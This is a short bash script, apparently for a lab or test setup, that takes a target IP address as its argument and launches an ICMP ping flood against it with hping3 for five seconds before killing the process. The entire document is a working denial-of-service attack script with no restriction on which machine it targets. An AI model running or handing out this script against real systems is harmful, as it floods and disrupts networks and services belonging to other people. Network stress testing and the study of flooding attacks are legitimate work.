
#This script takes command line argument: IP address of the target machine and generate a ping attack on it using hping3 tool.


#!/bin/bash
hping3 -1 --flood $1 &   # generating hping attack: ICMP packet flooding
sleep 5				# attack runniug for 5 seconds
kill $!
sleep 3
